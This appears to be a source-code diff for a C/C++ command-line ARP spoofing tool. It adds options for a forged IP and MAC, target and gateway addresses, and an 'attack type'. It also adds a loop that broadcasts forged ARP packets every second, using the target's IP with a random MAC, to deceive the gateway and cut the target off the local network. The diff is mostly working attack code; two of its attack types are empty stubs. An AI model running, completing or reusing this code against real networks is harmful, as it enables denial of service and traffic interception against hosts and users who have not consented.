@@ -56,7 +56,7 @@ static void usage() {
     fprintf(stdout, "    -li            : get network interfaces info\n");
     fprintf(stdout, "    -t             : cut type:\n"
                     "                        "
-                    "0 - deceive the gateway\n"
+                    "0 - deceive the gateway (default)\n"
                     "                        "
                     "1 - deceive the host\n"
                     "                        "
@@ -65,6 +65,8 @@ static void usage() {
     fprintf(stdout, "    -scan          : scan inner host\n");
     fprintf(stdout, "    [-gwip ip]     : specify gateway ip\n");
     fprintf(stdout, "    [-gwmac mac]   : specify gateway mac\n");
+    fprintf(stdout, "    [-fgip ip]     : specify forged ip\n");
+    fprintf(stdout, "    [-fgmac mac]   : specify forged mac\n");
     fprintf(stdout, "    -target ip     : target ip\n");
     fprintf(stdout, "    -h             : help\n");
     fprintf(stdout, "\nBest wishes!! Contact float0001@gmail.com.\n");
@@ -129,69 +131,120 @@ static void scan_host(const char* ifname) {
         recv.join();
     }
 }
+static int show_if(const char* ifname, interface_item_t& if_info) {
+    if_info.name = "";
+    if_info.ip = 0;
+    if_info.ip_str = "";
+    if_info.netmask_str = "";
+    if_info.mac_str = "";
+    if_info.gw_ip_str = "";
+    if_info.gw_mac_str = "";
+    if (get_if_info(ifname, if_info) != 0) {
+        fprintf(stderr, "get interface info error!\n");
+        return -1;
+    }
+    char stat_str[10];
+    fprintf(stdout, FORMLINE, "Id", "Name", "Ip", "Netmask",
+            "Mac", "Gateway Ip", "Gateway Mac", "Status");
+    if (if_info.status == 1) {
+        snprintf(stat_str, sizeof(stat_str), "up");
+    } else if (if_info.status == 0) {
+        snprintf(stat_str, sizeof(stat_str), "down");
+    } else {
+        snprintf(stat_str, sizeof(stat_str), "-");
+    }
+    fprintf(stdout, FORMLINE, "1", ifname, if_info.ip_str.c_str(),
+        if_info.netmask_str.c_str(), if_info.mac_str.c_str(),
+        if_info.gw_ip_str.c_str(), if_info.gw_mac_str.c_str(), stat_str);
+    return 0;
+}
 int main(int argc, const char *argv[]) {
     char *p = (char *)memrchr((const void *)argv[0], (int)'/', strlen(argv[0]));
     g_program_name = p == NULL ? argv[0] : (p + 1);
     const char* ifname = NULL;
     bool is_scan = false;
+    const char* target_ip = NULL;
+    const char* gw_ip = NULL;
+    uint8_t gw_mac[ETH_ALEN] = {0};
+    bool has_gw_mac = false;
+    const char* forged_ip = NULL;
+    uint8_t forged_mac[ETH_ALEN] = {0};
+    bool has_fg_mac = false;
+    int att_type = 0;
 
     for (int i = 1; i < argc; ++i) {
         if (strncasecmp(argv[i], "-li", 3) == 0) {
             get_ifs();
             return 0;
-       /* } else if (strncasecmp(argv[i], "-tgt_ip", 7) == 0) {
+        } else if (strncasecmp(argv[i], "-target", 7) == 0) {
             i++;
             if (i < argc) {
                 if (0 != check_ip(argv[i])) {
                     fprintf(stderr, "target ip invalid!\n");
                     return -1;
                 }
-                addrs.arp_tgt_ip = argv[i];
+                target_ip = argv[i];
             } else {
-                fprintf(stderr, "-tgt_ip need ip address.\n");
+                fprintf(stderr, "-target need ip address.\n");
                 return -1;
             }
-        }  else if (strncasecmp(argv[i], "-tgt_mac", 8) == 0) {
-            i++;
-            if (i < argc) {
-                if (NULL == get_mac_addr(argv[i], addrs.eth_dst_mac,
-                            sizeof(addrs.eth_dst_mac))) {
-                    fprintf(stderr, "ethernet destination mac invalid!\n");
-                    return -1;
-                }
-                memcpy(addrs.arp_tgt_mac, addrs.eth_dst_mac,
-                    sizeof(addrs.arp_tgt_mac));
-            } else {
-                fprintf(stderr, "-tgt_mac need mac address.\n");
-                return -1;
-            }
-        } else if (strncasecmp(argv[i], "-fake_ip", 8) == 0) {
+        } else if (strncasecmp(argv[i], "-gwip", 5) == 0) {
             i++;
             if (i < argc) {
                 if (0 != check_ip(argv[i])) {
-                    fprintf(stderr, "fake ip invalid!\n");
+                    fprintf(stderr, "gateway ip invalid!\n");
                     return -1;
                 }
-                addrs.arp_snd_ip = argv[i];
+                gw_ip = argv[i];
             } else {
-                fprintf(stderr, "-fake_ip need ip address.\n");
+                fprintf(stderr, "-gwip need ip address.\n");
                 return -1;
             }
-        } else if (strncasecmp(argv[i], "-fake_mac", 9) == 0) {
+        }  else if (strncasecmp(argv[i], "-gwmac", 6) == 0) {
             i++;
             if (i < argc) {
-                if (NULL == get_mac_addr(argv[i], addrs.eth_src_mac,
-                            sizeof(addrs.eth_src_mac))) {
-                    fprintf(stderr, "target mac invalid!\n");
+                if (NULL == get_mac_addr(argv[i], gw_mac, sizeof(gw_mac))) {
+                    fprintf(stderr, "gateway mac invalid!\n");
                     return -1;
                 }
-                memcpy(addrs.arp_snd_mac, addrs.eth_src_mac,
-                    sizeof(addrs.arp_snd_mac));
+                has_gw_mac = true;
             } else {
-                fprintf(stderr, "-fake_mac need mac address.\n");
+                fprintf(stderr, "-gwmac need mac address.\n");
                 return -1;
             }
-            */
+        } else if (strncasecmp(argv[i], "-fgip", 5) == 0) {
+            i++;
+            if (i < argc) {
+                if (0 != check_ip(argv[i])) {
+                    fprintf(stderr, "forged ip invalid!\n");
+                    return -1;
+                }
+                forged_ip = argv[i];
+            } else {
+                fprintf(stderr, "-fgip need ip address.\n");
+                return -1;
+            }
+        } else if (strncasecmp(argv[i], "-fgmac", 6) == 0) {
+            i++;
+            if (i < argc) {
+                if (NULL == get_mac_addr(argv[i], forged_mac,
+                            sizeof(forged_mac))) {
+                    fprintf(stderr, "forged mac invalid!\n");
+                    return -1;
+                }
+                has_fg_mac = true;
+            } else {
+                fprintf(stderr, "-fgmac need mac address.\n");
+                return -1;
+            }
+        } else if (strncasecmp(argv[i], "-t", 2) == 0) {
+            i++;
+            if (i < argc) {
+                att_type = atoi(argv[i]);
+            } else {
+                fprintf(stderr, "-t need .attack type\n");
+                return -1;
+            }
         } else if (strncasecmp(argv[i], "-i", 2) == 0) {
             i++;
             if (i < argc) {
@@ -213,6 +266,65 @@ int main(int argc, const char *argv[]) {
         scan_host(ifname);
         return 0;
     }
+    if (target_ip == NULL) {
+        fprintf(stderr, "Please specify target ip!!\n");
+        usage();
+    }
+
+    interface_item_t if_info;
+    if (show_if(ifname, if_info) != 0) {
+        return -1;
+    }
+    arp_cheat_addr_t req_arpbuf;
+    req_arpbuf.if_name = ifname;
+    if (att_type == 0) {
+        if (gw_ip == NULL && if_info.gw_ip_str.size() <= 0) {
+            fprintf(stderr, "We need gateway ip!\n");
+            return -1;
+        }
+        if (!has_gw_mac && if_info.gw_mac_str.size() <= 0) {
+            fprintf(stderr, "We need gateway mac!\n");
+            return -1;
+        }
+        fprintf(stdout, "======>attacking");
+        fflush(stdout);
+        while (1) {
+            uint8_t broad[ETH_ALEN] = BROADCAST_ADDR;
+            req_arpbuf.op = 1;
+            req_arpbuf.arp_tgt_ip = gw_ip ? gw_ip : if_info.gw_ip_str.c_str();
+            memcpy(req_arpbuf.eth_dst_mac, broad, ETH_ALEN);
+            bzero(req_arpbuf.arp_tgt_mac, ETH_ALEN);
+            req_arpbuf.arp_snd_ip = target_ip;
+            req_arpbuf.arp_tgt_ip =
+                gw_ip == NULL ? if_info.gw_ip_str.c_str() : gw_ip;
+            get_mac_addr(get_rand_mac().c_str(), req_arpbuf.eth_src_mac,
+                    ETH_ALEN);
+            memcpy(req_arpbuf.arp_snd_mac, req_arpbuf.eth_src_mac, ETH_ALEN);
+            send_arp_packet(&req_arpbuf);
+
+
+
+/*
+            memcpy(req_arpbuf.eth_dst_mac, has_gw_mac ? gw_mac : if_info.gw_mac,
+                    ETH_ALEN);
+            memcpy(req_arpbuf.arp_tgt_mac, has_gw_mac ? gw_mac : if_info.gw_mac,
+                    ETH_ALEN);
+            req_arpbuf.arp_snd_ip = target_ip;
+            */
+            sleep(1);
+            fprintf(stdout, ".");
+            fflush(stdout);
+        }
+        fprintf(stdout, "\n");
+    } else if (att_type == 1) {
+
+    } else if (att_type == 2) {
+
+    } else {
+        fprintf(stderr, "unknown attack type, [%d]\n", att_type);
+        return -1;
+    }
+
     return 0;
 }
 
